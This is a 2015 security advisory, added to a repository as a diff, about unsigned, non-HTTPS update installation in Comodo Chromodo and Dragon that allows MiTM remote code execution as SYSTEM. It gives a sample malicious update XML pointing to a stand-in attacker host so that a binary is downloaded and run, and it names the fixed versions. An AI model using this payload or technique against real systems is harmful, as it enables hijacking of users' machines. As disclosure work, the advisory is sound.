@@ -1,0 +1,80 @@
+SRT-VR-08OCT2015: Comodo Chromodo chromodo_update.exe Unsigned Update Installation
+
+Severity:
+MEDIUM (MiTM Assisted RCE)
+
+
+Systems Affected:
+* Comodo Chromodo < v48.12.18.238
+* Comodo Dragon < v48.12.18.243
+NOTE: Chromodo included and set as default browser in default installations of Comodo Internet Security
+   - Tested Against 8.2.0.4703
+
+
+Description:
+A remote code execution vulnerability exists within Comodo Chromodo / Dragon that allows a malicious 
+MiTM actor (or someone able to manipulate the DNS resolutions for a targetted user) to execute 
+arbitrary code as NT AUTHORITY\SYSTEM. The vulnerability is due to the lack of any code-signing 
+signature validation of installer packages. This issue is especially ironic since Comodo issue 
+code-signing certificates as part of their business.
+
+Chromodo is set as the default browser upon installed Comodo Internet Security (CIS), and goes so 
+far as even replacing Google Chrome shortcuts with Chromodo on the desktop and Start Menu. While 
+this vulnerability is not necessarily part of the CIS code base, from our testing, it came along for
+the ride and puts default unpatched CIS installations at risk.
+
+  
+Technical Description:
+Updates for Comodo's browser, Chromodo, are performed automatically or whenever a user launches the 
+browser and goes to the "About Chromodo" option and selects update browser. In the former case, no
+user interaction is requested or required ; in the later, the user must agree to the update.
+
+As part of the update routine, the chromodo_updater.exe service is instantiated and will download 
+chromodo.inf from http://download.comodo.com/browser/update/chromodo/chromodo/chromodo.inf 
+(NOTE: no use of SSL certificate, of which the vendor also sells).
+This inf is an XML file that declares what version of Chromodo is available, and the full 
+(non-relative) URL to grab the installer binary.
+
+Upon checking the latest advertised version available, if it is higher than the currently-installed 
+version, Chromodo_Installer.exe will download and execute this file. No checking of any code-signing 
+or HTTPS SSL certificate takes place, and the binary is executed as SYSTEM with the --need-show-eula 
+CLI flag.
+
+An example of a rudimentary "exploit" inf response might look like the following:
+"""
+<?xml version='1.0' encoding='UTF-8'?>
+<DragonVersion version='57.9.12.400' url='http://toolegittoclick.com/putty.exe'/>
+"""
+
+An attacker that is able to either (1) adjust the DNS resolution for download.comodo.com, or (2) 
+adjust the HTTP response would be able to manipulate the version and the URL of the software. If the 
+attacker were to point a higher version of software available at a URL they control, they could 
+easily execute an arbitrary PE as NT AUTHORITY\SYSTEM.
+
+
+Researcher Commentary:
+Based on the slow vendor response time and other issues discovered in the Chomodo suite by Google's 
+Project Zero (https://code.google.com/p/google-security-research/issues/detail?id=704), this 
+researcher recommends not using the Chromodo add-on and uninstalling it from CIS installations if
+that is the AV chosen.
+
+
+Mitigation / Protection:
+Upgrade your affected software suites to the following or greater:
+* Comodo Dragon v48.12.18.243
+* Comodo Chromodo v48.12.18.238
+
+
+Credit:Discovery:
+Andre Derek Protas of CyberPoint SRT
+
+
+Related Links:
+* Vendor Advisory:
+  - https://forums.comodo.com/news-announcements-feedback-cd/chromodo-48-dragon-48-are-now-available-for-download-t114917.0.html
+* Dragon v48.12.18.243:
+  - http://download.comodo.com/browser/update/dragon/dragonsetup.exe
+* Chromodo v48.12.18.238:
+  - http://download.comodo.com/browser/update/chromodo/chromodosetup.exe
+* Timeline comparison:
+  - https://www.cyberpointllc.com/srt/posts/srt-vulnerability-response-a-tale-of-two-vendors.html
